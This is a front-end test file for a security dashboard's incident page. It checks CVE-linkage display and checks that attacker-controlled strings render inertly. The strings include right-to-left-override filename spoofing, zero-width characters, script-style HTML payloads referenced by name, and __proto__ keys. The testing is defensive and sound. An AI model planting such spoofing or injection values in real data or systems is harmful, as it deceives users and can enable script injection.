    expect(within(rows[0]).getByText('web-decoy')).toBeInTheDocument()
    expect(within(rows[0]).getByText('받음')).toBeInTheDocument()
    expect(within(rows[0]).getByText('비해당')).toBeInTheDocument()
    expect(within(rows[0]).getByText(/모의 서비스다/)).toBeInTheDocument()
    expect(within(rows[2]).getByText('미확인')).toBeInTheDocument()
    expect(within(rows[2]).getByText(/비해당으로 보지 않는다/)).toBeInTheDocument()

    // CVE 표
    const cveRow = within(panel.getByRole('table', { name: '이어진 CVE' })).getAllByRole('row')[1]
    expect(within(cveRow).getByText('CVE-2024-36401')).toBeInTheDocument()
    expect(within(cveRow).getByText('KEV')).toBeInTheDocument()
    expect(within(cveRow).getByText('2024-07-15')).toBeInTheDocument()
    expect(within(cveRow).getByText('사용 확인')).toBeInTheDocument()
    expect(within(cveRow).getByText('9.8 CRITICAL')).toBeInTheDocument()
    expect(within(cveRow).getByText(/94\.4%/)).toBeInTheDocument()
    expect(within(cveRow).getByText('(백분위 99.9)')).toBeInTheDocument()

    // 신선도(KST)
    expect(panel.getByText('KEV 수집')).toBeInTheDocument()
    expect(panel.getByText('2026-09-25 11:00')).toBeInTheDocument()
    expect(panel.getByText('배포판 대조')).toBeInTheDocument()
    expect(panel.getByRole('link', { name: '자산 · 취약점' })).toHaveAttribute('href', '/inventory')

    // 머리글의 심각도 표기(소문자)는 여전히 하나뿐이다
    expect(screen.getByText('critical')).toHaveAttribute('data-severity', 'critical')
  })

  it('R106 처럼 서명이 여럿이고 KEV 가 아닌 CVE 는 등재일 · 랜섬웨어 칸을 비우고 부른 서명을 적는다', async () => {
    const cti = ctiFor({
      rule_id: 'R106',
      signatures: [
        signature({ id: 'apache-path-traversal', product: 'Apache HTTP Server', vendor: 'Apache', cves: ['CVE-2021-41773'], kev_products: null, summary: 'affected', applicability: [] }),
        signature({ id: 'hikvision-weblanguage', product: 'Hikvision 카메라 웹 서버', vendor: 'Hikvision', mapping: 'explicit', methods: ['PUT'], cves: ['CVE-2021-36260'], kev_products: null }),
      ],
      cves: [cve({ cve_id: 'CVE-2021-41773', signature_ids: ['apache-path-traversal'], kev: null, cvss: null, epss: null, description: null })],
    })
    stubApi({ cti })
    renderRoutes(routes(), PATH)
    const panel = within(await screen.findByRole('region', { name: '취약점 연계' }))
    expect(panel.getByText('명시 대응')).toBeInTheDocument()
    expect(panel.getByText('hikvision-weblanguage · PUT 만')).toBeInTheDocument()
    expect(panel.getByText('해당')).toBeInTheDocument()
    expect(panel.getByText(/자산 표가 비어 있어 적용 여부를 판정하지 못했습니다/)).toBeInTheDocument()
    const row = within(panel.getByRole('table', { name: '이어진 CVE' })).getAllByRole('row')[1]
    expect(within(row).getByText('apache-path-traversal')).toBeInTheDocument()
    expect(within(row).queryByText('KEV')).toBeNull()
    expect(within(row).getAllByText('—').length).toBeGreaterThanOrEqual(4)
  })

  it('서명 규칙 사건이 아니면(applicable=false) 구역을 그리지 않는다', async () => {
    stubApi()
    const client = noRetryClient()
    renderRoutes(routes(), PATH, client)
    expect(await screen.findByRole('heading', { level: 1, name: 'R003 악성코드 투하' })).toBeInTheDocument()
    await waitFor(() => expect(client.getQueryState(ctiKeys.incident(KEY))?.status).toBe('success'))
    expect(screen.queryByRole('region', { name: '취약점 연계' })).toBeNull()
  })

  it('/cti 가 404 면 구역 안에 안내 한 줄만 보이고 나머지 구역은 그대로다', async () => {
    stubApi({ cti: { detail: '인시던트를 찾을 수 없습니다' }, ctiStatus: 404 })
    renderRoutes(routes(), PATH, noRetryClient())
    const region = await screen.findByRole('region', { name: '취약점 연계' })
    expect(within(region).getByText(/취약점 연계 정보가 없습니다/)).toBeInTheDocument()
    expect(within(region).queryByRole('alert')).toBeNull()
    expect(screen.getByRole('heading', { level: 1, name: 'R003 악성코드 투하' })).toBeInTheDocument()
    expect(screen.getByRole('region', { name: '조치와 판정' })).toBeInTheDocument()
  })

  it('/cti 가 503 이면 구역 안에서 오류와 다시 시도를 보이고, 상세는 그대로다', async () => {
    const fetch = stubApi({ cti: { detail: 'CTI 조회 실패' }, ctiStatus: 503 })
    renderRoutes(routes(), PATH, noRetryClient())
    const region = await screen.findByRole('region', { name: '취약점 연계' })
    const panel = within(region)
    expect(panel.getByRole('alert')).toHaveTextContent('데이터를 불러오지 못했습니다')
    expect(panel.getByText('CTI 조회 실패 (HTTP 503)')).toBeInTheDocument()
    expect(screen.getByRole('heading', { level: 1, name: 'R003 악성코드 투하' })).toBeInTheDocument()
    expect(screen.getByRole('region', { name: '규칙이 본 것' })).toBeInTheDocument()

    const ctiCalls = () => fetch.mock.calls.filter(([input]) => input === incidentCtiPath(KEY)).length
    const before = ctiCalls()
    fireEvent.click(panel.getByRole('button', { name: '다시 시도' }))
    await waitFor(() => expect(ctiCalls()).toBeGreaterThan(before))
  })

  it('공개 정보가 오래되면 비해당으로 읽지 말라는 띠와 오래됨 표지를 보인다', async () => {
    const f = freshness()
    stubApi({ cti: ctiFor({ stale: true, freshness: { ...f, kev: { ...f.kev, stale: true }, assets: { ...f.assets, stale_assets: ['fw'] } } }) })
    renderRoutes(routes(), PATH)
    const panel = within(await screen.findByRole('region', { name: '취약점 연계' }))
    expect(panel.getByText(/공개 정보가 오래됐습니다\. 비해당으로 읽지 않습니다\./)).toHaveTextContent('오래된 출처: KEV')
    expect(panel.getAllByText('오래됨')).toHaveLength(2)
    expect(panel.getByText('오래됨 · fw')).toBeInTheDocument()
  })

  it('서명 규칙 사건인데 CTI 표가 없으면(available=false) 적용 안내를 보인다', async () => {
    stubApi({ cti: { as_of: '2026-09-18T08:00:00Z', incident_key: KEY, applicable: true, available: false } })
    renderRoutes(routes(), PATH)
    const region = await screen.findByRole('region', { name: '취약점 연계' })
    expect(within(region).getByText(/공개 취약점 정보 표가 아직 없습니다/)).toBeInTheDocument()
  })
})

// ---------------------------------------------------------------- #41 비신뢰 문자열 표시

/** 공격자 값이 닿는 자리마다 악성 표본을 넣은 사건(원문 · 행위 · 표본 키와 값 · 세션 · 대상 · 차단 · 흡수 · 이력 · 제안 근거) */
function hostileDetail(): IncidentDetail {
  const line = { ts: '2026-09-18T06:00:30+00:00', sensor: MIXED, eventid: 'cowrie.command.input', session: MIXED, username: HOSTILE.rlo, input: MIXED, url: `/x?q=${HOSTILE.img}`, shasum: HOSTILE.zwsp, http_method: HOSTILE.svg, http_status: 200 }
  const base = detail()
  return detail({
    target: `user:${MIXED}`,
    evidence: {
      sample: [{ ts: '2026-09-18T06:00:00+00:00', url: MIXED, [HOSTILE.rlo]: HOSTILE.jsUrl, [HOSTILE.img]: LONG, session: MIXED }, MIXED],
      sessions: [MIXED, LONG],
      observed_count_max: 3,
    },
    behavior: [line, { ...line, input: LONG }],
    raw: [
      { ...line, has_password: true, user_agent: MIXED, message: HOSTILE.decoy },
      { ...line, input: null, has_password: false, user_agent: null, message: LONG },
    ],
    actor: {
      ...base.actor,
      history: { first_seen: '2026-09-10T00:00:00+00:00', last_seen: '2026-09-18T06:10:00+00:00', events: 1, sensors: [MIXED], sessions: 1 },
      blocked: { reason: MIXED, method: HOSTILE.style, created_at: '2026-09-18T07:00:00+00:00', expires_at: '2999-01-01T00:00:00+00:00', released_at: null, enforced_at: null },
    },
    absorbed: absorbed({ items: [{ ...absorbed().items[0], reason: MIXED, payload: `${HOSTILE.rlo}${HOSTILE.img}` }], total: 1, sources: 1 }),
    verdicts: [{ id: 1, verdict: 'threat', reason: MIXED, observed_value: null, operator: HOSTILE.rlo, created_at: '2026-09-18T07:00:00+00:00', proposed: null, decision_seconds: null }],
    actions: [{ id: 2, action: 'block_ip', operator: HOSTILE.zwsp, note: LONG, created_at: '2026-09-18T07:00:00+00:00' }],
    proposal: { verdict: 'threat', reasons: [MIXED] },
  })
}

function hostileCti() {
  return ctiFor({
    signatures: [signature({ product: MIXED, vendor: HOSTILE.rlo, source: LONG, applicability: [applicability({ reason: MIXED })] })],
    cves: [cve({ kev: null, description: MIXED })],
  })
}

describe('IncidentDetailPage · 비신뢰 문자열(#41)', () => {
  afterEach(() => {
    vi.unstubAllGlobals()
  })

  it('악성 표본을 글자로만 그리고 숨은 문자는 표식 · 줄바꿈은 ↵ 로 보이며 2만 자는 접는다', async () => {
    stubApi({ body: hostileDetail(), cti: hostileCti() })
    const { container } = renderRoutes(routes(), PATH, noRetryClient())
    await screen.findByRole('region', { name: '취약점 연계' })
    await readyPanel()
    const raw = screen.getByRole('region', { name: '원문 로그' })
    fireEvent.click(within(raw).getByRole('button', { name: '펼치기' }))

    expectInertDom(container)
    expectMixedRevealed(container)

    // 사건 머리: 대상은 표식으로, 한 칸 안에서 격리된다
    const target = screen.getByText('대상', { selector: 'dt' }).nextElementSibling as HTMLElement
    expect(target.textContent).toBe(`user:${revealHidden(MIXED)}`)
    expect(target.querySelector('bdi')).toHaveAttribute('dir', 'ltr')

    // ④ 원문: 한 사건 줄은 li 하나(가짜 줄 없음) · 필드마다 따로 격리 · 필드 사이 공백 두 칸
    const lines = within(within(raw).getByRole('list', { name: '원문 로그 줄' })).getAllByRole('listitem')
    expect(lines).toHaveLength(2)
    expect(lines[0].querySelectorAll('bdi').length).toBeGreaterThanOrEqual(9)
    expect(lines[0].textContent).toContain('  user=admin⟨U+202E⟩gnp.exe  password=[있음]  input=')
    expect(lines[0].textContent).toMatch(/줄1↵2026-09-18 15:00:00 decoy login\.success$/)

    // ① 표본: 공격자 키도 머리글에서 표식 · 글자로 보인다 · 긴 세션 칩은 접힌다
    const evidence = screen.getByRole('region', { name: '규칙이 본 것' })
    const heads = within(evidence).getAllByRole('columnheader').map((th) => th.textContent)
    expect(heads).toContain('admin⟨U+202E⟩gnp.exe')
    expect(heads).toContain(HOSTILE.img)
    expect(within(evidence).getByRole('button', { name: '… 19,936자 더 · 펼치기' })).toBeInTheDocument()

    // ③ 흡수 페이로드: 말풍선도 표식으로
    const actor = screen.getByRole('region', { name: '행위자 이력' })
    expect(within(actor).getByTitle(revealHidden(`${HOSTILE.rlo}${HOSTILE.img}`))).toBeInTheDocument()

    // ⑤ 이력 · 판정 패널: 행위자 이름 표식
    const history = screen.getByRole('table', { name: '판정 · 조치 이력' })
    const actionRow = history.querySelector('[data-history-kind="action"]') as HTMLElement
    expect(within(actionRow).getAllByRole('cell')[3].textContent).toBe('ad⟨U+200B⟩min')
    expect(screen.getByLabelText('도구 제안')).toHaveTextContent('⟨U+202E⟩')

    // ⑥ 취약점 연계: 요약 말풍선 · 표 이름도 표식으로
    const vuln = screen.getByRole('region', { name: '취약점 연계' })
    expect(within(vuln).getByTitle(revealHidden(MIXED))).toBeInTheDocument()
    expect(within(vuln).getByRole('table', { name: `${revealHidden(MIXED)} 자산 적용` })).toBeInTheDocument()

    // 2만 자: 원문 · 행위 · 표본 값 · 조치 메모 · 서명 근거가 접혀 있다가 펼치면 전부 보인다
    expectLongFolds(container)
  })

  it('주소로 받은 사건 키가 악성이어도 404 화면에 글자로만 보인다', async () => {
    stubApi()
    const key = `R201|v2|user:${MIXED}|2026-09-18T06:00:00+00:00`
    const { container } = renderRoutes(routes(), `/incidents/${encodeURIComponent(key)}`, noRetryClient())
    expect(await screen.findByText('인시던트를 찾을 수 없습니다')).toBeInTheDocument()
    expectInertDom(container)
    expectMixedRevealed(container)
    expect(container.textContent).toContain(revealHidden(key))
  })

  it('표본 키가 __proto__ · constructor 여도 없는 칸은 물려받은 값이 아니라 빈 칸 표시(—)다', async () => {
    // JSON.parse 로 만들어야 __proto__ 가 제 키로 남는다(서버 응답과 같다)
    const sample = JSON.parse('[{"__proto__": "p", "constructor": "c", "url": "x"}, {"url": "y"}]') as EvidenceSample[]
    stubApi({ body: detail({ evidence: { sample, sessions: [], observed_count_max: 3 } }) })
    renderRoutes(routes(), PATH, noRetryClient())
    const table = await screen.findByRole('table', { name: '규칙이 남긴 표본' })
    expect(within(table).getAllByRole('columnheader').map((th) => th.textContent)).toEqual(['__proto__', 'constructor', 'url'])
    const [, first, second] = within(table).getAllByRole('row')
    expect(within(first).getAllByRole('cell').map((td) => td.textContent)).toEqual(['p', 'c', 'x'])
    expect(within(second).getAllByRole('cell').map((td) => td.textContent)).toEqual(['—', '—', 'y'])
  })
})
